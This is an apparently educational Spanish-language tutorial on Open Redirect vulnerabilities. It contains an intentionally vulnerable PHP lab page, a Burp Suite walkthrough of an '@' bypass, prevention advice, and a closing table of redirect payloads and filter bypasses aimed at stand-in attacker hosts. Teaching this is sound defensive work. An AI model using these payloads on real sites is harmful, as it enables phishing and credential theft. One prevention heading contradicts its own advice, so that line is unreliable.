---
icon: openid
---

# Vulnerabilidad Open Redirect

## Practica de explotación `Open Redirect`

Imaginemos que tenemos esta pagina web en `PHP`:

```php
<?php
// Comprobamos si se pasa el parámetro 'url'
if (isset($_GET['url'])) {
    $url = $_GET['url'];

    // Si contiene '@', la redirección es permitida
    if (strpos($url, '@') !== false) {
        // Redirige al sitio indicado por el atacante
        header("Location: " . $url);
        exit();
    } else {
        // Si no tiene '@', redirige a la página 'index.html'
        header("Location: http://openredirect.dl/index.html");
        exit();
    }
} else {
    // Redirige directamente a la URL con el parámetro 'url'
    header("Location: http://openredirect.dl/index.php?url=http://openredirect.dl/index.html");
    exit();
}
?>
```

Vemos que en la siguiente linea esta la vulnerabilidad:

```php
if (strpos($url, '@') !== false) {
        // Redirige al sitio indicado por el atacante
        header("Location: " . $url);
        exit();
```

Tambien estamos viendo que cada vez que entramos en el `dominio` nos redirije al `index.html`, si nosotros metemos manualmente en la `URL` lo siguiente, pero lo capturamos con `BuprSuite`:

```
URL = http://openredirect.dl/index.php
```

Una vez capturada la peticion con `BurpSuite` le daremos una vez a `Forward` y veremos lo siguiente:

```
GET /index.php?url=http://openredirect.dl/index.html HTTP/1.1
Host: openredirect.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Estamos viendo en la peticion la `redireccion` que se esta realizando, si nosotros cambiamos eso, por algo asi:

```
/index.php?url=http://google.es
```

Y enviamos la peticion, pero veremos que no funciona ya que esta bien sanitizado, pero si realizamos un `bypass` para hacer creer al servidor que estamos llamando a un `subdominio`, veremos que funciona poniendo lo siguiente:

```
/index.php?url=http://openredirect.dl@google.es
```

Si enviamos esta peticion asi, veremos que nos redirige a `google.es`, por lo que habremos aprovechado dicha vulnerabilidad.

## Explicación detallada `Open Redirect`

### ¿Qué es una vulnerabilidad **Open Redirect**?

Una **vulnerabilidad Open Redirect** (Redirección Abierta) ocurre cuando un sitio web permite a los usuarios ser redirigidos a otro sitio web a través de un parámetro en la URL (dirección web), sin validar adecuadamente esa URL de destino. En otras palabras, un atacante puede manipular la URL del sitio web de una manera que haga que los usuarios sean redirigidos a un sitio web malicioso, sin que el usuario se dé cuenta de que ha sido engañado.

#### Ejemplo básico de **Open Redirect**:

Imagina que tienes un sitio web llamado `www.misitio.com`. Este sitio tiene una página que, cuando visitas, te redirige a otro sitio basado en un parámetro de la URL. La URL podría ser algo como esto:

```bash
https://www.misitio.com/redirigir.php?url=https://www.otro-sitio.com
```

En este caso, el parámetro `url` indica la URL de destino. Si `redirigir.php` no valida correctamente este parámetro, podría permitir que cualquier URL sea utilizada, incluyendo URLs maliciosas, como esta:

```bash
https://www.misitio.com/redirigir.php?url=http://malicious-site.com
```

Si un atacante engaña a un usuario para que haga clic en un enlace como el anterior, el usuario sería redirigido sin saberlo a un sitio malicioso. Este tipo de ataque se conoce como **Open Redirect**.

***

### ¿Por qué es peligrosa la vulnerabilidad **Open Redirect**?

Aunque una **Open Redirect** no es un ataque directamente destructivo (como una inyección de SQL o una ejecución remota de código), puede ser muy peligrosa por varias razones:

1. **Phishing**: Los atacantes pueden aprovechar esta vulnerabilidad para engañar a los usuarios. Por ejemplo, pueden crear un enlace en un correo electrónico o en una página web que parece legítimo, pero al hacer clic en él, el usuario es redirigido a un sitio falso que imita a un banco o una tienda en línea. En estos sitios falsos, los usuarios pueden ser engañados para que introduzcan información sensible, como contraseñas o detalles de tarjeta de crédito.
2. **Robo de credenciales**: Los atacantes pueden usar esta vulnerabilidad para redirigir a los usuarios a sitios de phishing donde se roban sus credenciales de inicio de sesión. Esto podría resultar en el acceso no autorizado a cuentas bancarias, redes sociales, sistemas internos, etc.
3. **Confianza comprometida**: Si los usuarios descubren que un sitio web confiable tiene una vulnerabilidad **Open Redirect**, pueden perder la confianza en ese sitio, lo que afecta la reputación de la empresa o el servicio.
4. **Facilitación de ataques de Cross-Site Scripting (XSS)**: Un atacante también podría usar una vulnerabilidad **Open Redirect** en combinación con otras vulnerabilidades, como **Cross-Site Scripting** (XSS), para ejecutar scripts maliciosos en los navegadores de los usuarios.

***

### ¿Cómo se explota la vulnerabilidad **Open Redirect**?

#### **Fase 1: Identificación de la vulnerabilidad**

El atacante primero necesita identificar si el sitio web es vulnerable a **Open Redirect**. Esto generalmente se hace observando parámetros de la URL que parecen estar relacionados con redirecciones. Estos parámetros suelen llamarse `url`, `redirect`, `next`, `destination`, etc.

Ejemplo de un parámetro vulnerable:

```bash
https://www.misitio.com/redirect?url=https://www.tercer-sitio.com
```

El atacante puede probar cambiar el valor del parámetro `url` a una URL externa maliciosa para ver si el sitio permite la redirección a esa URL.

#### **Fase 2: Ataque**

Una vez que el atacante ha confirmado que el sitio es vulnerable, puede crear un enlace con una URL manipulada que redirige al usuario a un sitio malicioso. El atacante podría enviar este enlace por correo electrónico o publicarlo en algún lugar en la web, engañando a los usuarios para que hagan clic en él.

Ejemplo de un enlace malicioso:

```bash
https://www.misitio.com/redirect?url=http://malicious-website.com
```

Cuando el usuario hace clic en este enlace, es redirigido al sitio malicioso sin darse cuenta.

#### **Fase 3: Consecuencias del ataque**

Una vez redirigido, el atacante podría aprovechar la redirección para hacer que el usuario realice alguna acción en su sitio malicioso, como ingresar información personal o descargar software malicioso.

***

### ¿Cómo prevenir la vulnerabilidad **Open Redirect**?

#### 1. **Validar y filtrar entradas de usuario**

Es fundamental que el servidor **valide y filtre** cualquier parámetro de la URL que pueda redirigir al usuario a otro sitio. En lugar de aceptar cualquier URL externa, el servidor debe asegurarse de que solo se redirija a sitios **de confianza**.

Ejemplo de validación simple en PHP:

```php
$allowed_sites = ['https://www.misitio.com', 'https://www.otro-sitio.com'];

if (in_array($url, $allowed_sites)) {
    // Redirige solo a los sitios de confianza
    header("Location: " . $url);
} else {
    // Redirige a una página de error o a la página principal
    header("Location: https://www.misitio.com/error");
}
```

#### 2. **Usar URL absolutas en lugar de relativas**

Si es posible, evita permitir redirecciones a URLs completas y usa URLs relativas dentro de tu dominio. Esto puede ayudar a evitar que los usuarios sean redirigidos fuera de tu sitio web.

#### 3. **Advertir al usuario de redirecciones**

Al redirigir al usuario a un sitio externo, es recomendable mostrar un mensaje de advertencia o una página intermedia que indique al usuario a dónde lo estás enviando. Esto hace que el usuario sea más consciente de la redirección.

#### 4. **Deshabilitar redirecciones cuando no sea necesario**

Si la redirección a sitios externos no es necesaria para la funcionalidad de tu sitio web, simplemente desactívala por completo. Esto elimina la vulnerabilidad de raíz.

***

### Conclusión

La vulnerabilidad **Open Redirect** es un fallo de seguridad que permite a los atacantes redirigir a los usuarios a sitios maliciosos mediante la manipulación de parámetros de la URL. Aunque esta vulnerabilidad no es tan grave como otros tipos de ataques, puede ser utilizada de manera efectiva para realizar ataques de phishing, robar credenciales o hacer daño a la reputación de un sitio web.

Es fundamental que los desarrolladores web validen correctamente todas las entradas y redirecciones en su sitio para evitar esta vulnerabilidad. Implementando buenas prácticas de seguridad, como la validación de parámetros de URL y el uso de URLs absolutas, los desarrolladores pueden prevenir los ataques **Open Redirect** y proteger tanto a los usuarios como a su propia infraestructura web.

## Tabla de payloads y Bypasses

| **Descripción**                                       | **Payload/Bypass**                                                                                | **Explicación**                                                                 |
| ----------------------------------------------------- | ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| **Redirección a un sitio externo**                    | `https://www.victim.com/redirect?url=http://malicious-site.com`                                   | Redirige al atacante a un sitio malicioso.                                      |
| **Redirección a un sitio malicioso con `@`**          | `https://www.victim.com/redirect?url=http://malicious-site.com@attacker.com`                      | Usa el `@` para intentar engañar el sistema y redirigir a un sitio externo.     |
| **Redirección a un dominio legítimo (mismo dominio)** | `https://www.victim.com/redirect?url=https://www.victim.com/index.php`                            | Redirige al mismo dominio, pero puede ser usado para ocultar un ataque.         |
| **Uso de `//` para evitar validación de dominios**    | `https://www.victim.com/redirect?url=//attacker.com`                                              | Algunas validaciones de URL podrían no manejar correctamente las URLs con `//`. |
| **Redirección por IP (sin dominio)**                  | `https://www.victim.com/redirect?url=http://192.168.1.100`                                        | Utiliza una dirección IP directa en lugar de un nombre de dominio.              |
| **Redirección encubierta utilizando `%2e%2e%2f`**     | `https://www.victim.com/redirect?url=http://attacker.com/%2e%2e%2f%2e%2e%2fmalicious`             | Usa secuencias de escape de URL para tratar de eludir restricciones de URL.     |
| **Redirección doble (encubrir el ataque)**            | `https://www.victim.com/redirect?url=https://attacker.com/redirect?url=http://malicious-site.com` | Una redirección en cadena que lleva a un sitio malicioso.                       |
| **Redirección a una URL con puertos inusuales**       | `https://www.victim.com/redirect?url=http://attacker.com:8000/malicious`                          | Utiliza puertos inusuales para evitar algunas restricciones de filtrado.        |
| **Uso de caracteres especiales (URL encoding)**       | `https://www.victim.com/redirect?url=http://attacker.com%2F%2E%2E%2Fmalicious`                    | Codificación de caracteres especiales para evadir filtros o validaciones.       |

#### Notas importantes:

* **Redirección con `@`**: El uso del carácter `@` puede hacer que el sistema perciba la URL como parte de un subdominio. Esto puede evadir algunas validaciones si estas se enfocan en la parte del dominio.
* **Uso de `//` (doble barra)**: Algunas aplicaciones web pueden fallar al manejar URLs que comienzan con dos barras `//`. Esto puede ser utilizado para redirigir a un sitio externo sin que el sistema detecte el dominio de destino.
* **Secuencias de escape (`%2e%2e%2f`)**: Las secuencias de escape pueden ser utilizadas para intentar evadir filtros que validan URL a nivel superficial (por ejemplo, al detectar `../` como una parte de una ruta local).
* **Redirección en cadena**: Al redirigir a un URL que luego redirige a otro sitio malicioso, puedes evadir filtros de redirección más simples.

#### ¿Por qué evadir las validaciones?

Los filtros y validaciones que previenen vulnerabilidades **Open Redirect** pueden no ser lo suficientemente robustos, lo que hace que los atacantes utilicen diferentes técnicas para evadirlas. Algunas validaciones básicas solo verifican si el dominio contiene ciertos términos o usan listas blancas que pueden ser eludidas fácilmente.
